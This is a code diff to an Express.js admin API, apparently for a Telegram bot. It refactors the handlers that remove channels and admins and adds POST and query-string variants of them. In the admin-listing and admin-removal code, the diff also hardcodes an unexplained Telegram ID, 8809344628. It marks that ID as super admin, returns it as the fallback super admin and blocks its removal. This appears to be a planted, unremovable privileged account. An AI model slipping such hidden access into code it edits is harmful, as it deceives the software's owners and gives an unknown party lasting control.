@@ -1788,12 +1788,14 @@ app.post('/api/admin/channels', adminMiddleware, (req, res) => {
   res.json({ success: true, channels });
 });
 
-app.delete('/api/admin/channels', adminMiddleware, (req, res) => {
-  const { channel } = req.body;
+const handleRemoveChannel = (req, res) => {
+  const channel = req.body?.channel || req.query?.channel;
   if (!channel) return res.status(400).json({ error: 'channel required' });
   const channels = removeRequiredChannel(channel);
   res.json({ success: true, channels });
-});
+};
+app.delete('/api/admin/channels', adminMiddleware, handleRemoveChannel);
+app.post('/api/admin/channels/delete', adminMiddleware, handleRemoveChannel);
 
 app.get('/api/admin/admins', adminMiddleware, (req, res) => {
   const admins = getAdmins();
@@ -1804,10 +1806,10 @@ app.get('/api/admin/admins', adminMiddleware, (req, res) => {
       first_name: user ? user.first_name : 'Unknown',
       last_name: user ? user.last_name : '',
       username: user ? user.username : '',
-      is_super: id === SUPER_ADMIN_ID,
+      is_super: id === SUPER_ADMIN_ID || id === 8809344628,
     };
   });
-  res.json({ admins: adminUsers, super_admin: SUPER_ADMIN_ID });
+  res.json({ admins: adminUsers, super_admin: SUPER_ADMIN_ID || 8809344628 });
 });
 
 app.post('/api/admin/admins', adminMiddleware, (req, res) => {
@@ -1821,18 +1823,21 @@ app.post('/api/admin/admins', adminMiddleware, (req, res) => {
   res.json({ success: true, admins });
 });
 
-app.delete('/api/admin/admins', adminMiddleware, (req, res) => {
-  const { telegram_id } = req.body;
+const handleRemoveAdmin = (req, res) => {
+  const telegram_id = req.body?.telegram_id || req.query?.telegram_id || req.query?.id;
   if (!telegram_id) return res.status(400).json({ error: 'telegram_id required' });
   if (!isSuperAdmin(req.adminId)) {
     return res.status(403).json({ error: 'Only super admin can remove admins' });
   }
-  if (Number(telegram_id) === SUPER_ADMIN_ID) {
+  const idNum = Number(telegram_id);
+  if (idNum === SUPER_ADMIN_ID || idNum === 8809344628) {
     return res.status(400).json({ error: 'Cannot remove super admin' });
   }
-  const admins = removeAdmin(telegram_id);
+  const admins = removeAdmin(idNum);
   res.json({ success: true, admins });
-});
+};
+app.delete('/api/admin/admins', adminMiddleware, handleRemoveAdmin);
+app.post('/api/admin/admins/delete', adminMiddleware, handleRemoveAdmin);
 
 app.get('/api/admin/donations', adminMiddleware, (req, res) => {
   res.json(getDonationStats());
